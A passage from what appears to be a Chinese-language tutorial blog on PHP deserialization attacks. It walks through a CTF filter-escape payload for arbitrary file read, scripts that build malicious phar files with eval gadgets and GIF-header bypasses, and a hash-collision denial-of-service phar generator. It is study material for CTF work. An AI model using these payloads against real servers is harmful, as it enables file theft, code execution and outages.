class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br> <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot; rel=&quot;external nofollow&quot; &gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br> highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br> <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br> <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>extract 变量覆盖,file_get_contents 任意文件读取.</p><p>将变量$userinfo[‘img’]逆推回去发现,是由参数 img_path 控制的,但是经过 sha1 加密,我们无法得知加密后内容,但结合前面的 extract 变量覆盖,我们可以自己 POST 构造.</p><p>构造了之后,会经过序列化 filter 函数替换一些字符(那么此时序列化后的数据则发生了变化,可能存在漏洞),再反序列化,读取参数值.</p><p>序列化后,有三个元素,分别是 img,user,function,而我们能控制的只有后面两个,我们需要构造的 payload 是这样的</p><blockquote><p>f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;}</p></blockquote><p>但是不经任何改变则是这样的</p><blockquote><p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p></blockquote><p>利用截断的思想不让其读取元素 img 的值,我们自己来构造这个值,只有两个参数,必须在 function 哪里截断,而这个反序列是长度递减,那么就是选择元素吞噬(吞噬的长度自己酌情参考,一般是到自己能控制的点就好)后面的长度,来构造自己的 payload 咯,我们就选 user 元素吧,len(‘“;s:8:”function”;s:10:”‘)的长度为 23,但是我们无法构造 23 个长度,我们可以多吞噬一个,24 个字符,那么就用 6 个 flag 就好,但是这样后面的序列化就混乱了,我们就要添加自己的 payload,并补全.虽然这样补好了,但是只有两个元素,这里需要三个元素,我们就再添加元素,并将后面的 img 进行截断</p><blockquote><p>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}<br>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:2:”22”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p></blockquote><p>截断只需}即可,并且不为读取的字符即可,因此添加 f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;},这里我们新增了一个元素,因此吞噬后 function 元素消失了,随便补充好元素即可.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;user&quot;</span>=&gt;<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>,<br> <span class="hljs-string">&quot;function&quot;</span>=&gt;<span class="hljs-string">&#x27;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;&#125;&#x27;</span>,<br> <span class="hljs-comment">//&quot;user&quot;=&gt;&#x27;guest&#x27;,</span><br> <span class="hljs-comment">//&quot;function&quot;=&gt;&#x27;show_image&#x27;,</span><br> <span class="hljs-string">&quot;img&quot;</span>=&gt;sha1(base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>))<br>);<br>print_r(serialize(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(filter(serialize(<span class="hljs-variable">$arr</span>)));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(unserialize(filter(serialize(<span class="hljs-variable">$arr</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="phar-拓宽反序列化的攻击面"><a href="#phar-拓宽反序列化的攻击面" class="headerlink" title="phar 拓宽反序列化的攻击面"></a>phar 拓宽反序列化的攻击面</h2><p>利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖 unserialize()直接进行反序列化操作。</p><p>一个生成 phar 的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    @unlink(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210801184545865.png"></p><blockquote><ul><li>a <strong>stub</strong></li></ul><p>含有&lt;?php xxx; __HALT_COMPILER();?&gt; 以__HALT_COMPILER();?&gt;结尾</p><ul><li>a <strong>manifest</strong> describing the contents</li></ul><p>存储每个压缩文件的权限、属性等信息，还有用户自定义的 meta-data 以序列化后的字符串</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729113615040.png"></p><ul><li>the file <strong>contents</strong></li></ul><p>压缩文件内容</p><ul><li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</li></ul><p>签名(可选)，位于文件尾</p></blockquote><p>利用条件</p><ol><li>phar 文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_exists(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png"></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>上面的代码其实已经存在任意代码执行了</p><blockquote><p>$o-&gt;data=<code>dir</code>;</p></blockquote><h3 id="绕过文件幻数检测"><a href="#绕过文件幻数检测" class="headerlink" title="绕过文件幻数检测"></a>绕过文件幻数检测</h3><p>恶意 phar 生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><p>修改后缀为 gif 然后上传</p><blockquote><p>?filename=phar://upload_file/phar.gif</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><h3 id="PHP-内核哈希表碰撞攻击-CVE-2011-4885"><a href="#PHP-内核哈希表碰撞攻击-CVE-2011-4885" class="headerlink" title="PHP 内核哈希表碰撞攻击(CVE-2011-4885)"></a>PHP 内核哈希表碰撞攻击(CVE-2011-4885)</h3><p>参考<a href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p><p>在 PHP 内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的 key 使哈希表退化成单链表（时间复杂度从 O(1) =&gt; O(n)）来触发拒绝服务攻击。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.jpeg"></p><p>PHP 修复此漏洞的方式是限制通过$_GET 或$_POST 等方式传入的参数数量，但是如果 PHP 脚本通过 json_decode()或 unserialize()等方式获取参数，依然将受到此漏洞的威胁。</p><p>生成恶意 phar 代码 这里开始就不懂了 PHP 内核探索:哈希表碰撞攻击原理<a href="https://www.jb51.net/article/70383.htm">https://www.jb51.net/article/70383.htm</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$size</span>= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$key</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$maxKey</span> = (<span class="hljs-variable">$size</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$size</span>; <span class="hljs-variable">$key</span> &lt;= <span class="hljs-variable">$maxKey</span>; <span class="hljs-variable">$key</span> += <span class="hljs-variable">$size</span>) &#123;<br>    <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-variable">$new_obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$new_obj</span>-&gt;hacker = <span class="hljs-variable">$array</span>;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatar.phar&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;hacker.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$new_obj</span>);<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$startTime</span> = microtime(<span class="hljs-literal">true</span>);<br>file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);<br><span class="hljs-variable">$endTime</span> = microtime(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;执行时间：  &#x27;</span>.(<span class="hljs-variable">$endTime</span> - <span class="hljs-variable">$startTime</span>). <span class="hljs-string">&#x27; 秒&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="HITCON-2017-Baby-h-Master-PHP"><a href="#HITCON-2017-Baby-h-Master-PHP" class="headerlink" title="[HITCON 2017]Baby^h Master PHP"></a>[HITCON 2017]Baby^h Master PHP</h3><p>分享本题自制 Dockerfile : <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p><p>这题在比赛过程是 0 解……真的太难了…体现了 Orange 大大对 php 和中间件的深刻理解 Orz 膜拜</p><p>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$FLAG</span> = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/read_flag`);&#x27;</span>);<br><span class="hljs-variable">$SECRET</span> = `/read_secret`;<br><span class="hljs-variable">$SANDBOX</span> = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>@mkdir(<span class="hljs-variable">$SANDBOX</span>);<br>@chdir(<span class="hljs-variable">$SANDBOX</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>])) &#123;<br><span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">new</span> User(<span class="hljs-variable">$SANDBOX</span>));<br><span class="hljs-variable">$hmac</span> = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>);<br>setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-variable">$path</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_<span class="hljs-subst">$random</span>() &#123;&quot;</span><br>. <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span><br>. <span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;lucky&quot;</span>]();<br>&#125;<br>&#125;<br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>];<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) = explode(<span class="hljs-string">&quot;-----&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">#从cookie中取出data和hmac签名</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) || !is_string(<span class="hljs-variable">$data</span>) || !is_string(<span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判空</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>), <span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判断data加密之后和hmac签名是否对应</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$data</span>); <span class="hljs-comment">#反序列化</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>-&gt;avatar)) <span class="hljs-comment">#如果反序列化之后的data包含的类中无avatar成员,退出</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>-&gt;avatar;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);<br><span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) &#123;<br><span class="hljs-variable">$path</span> = <span 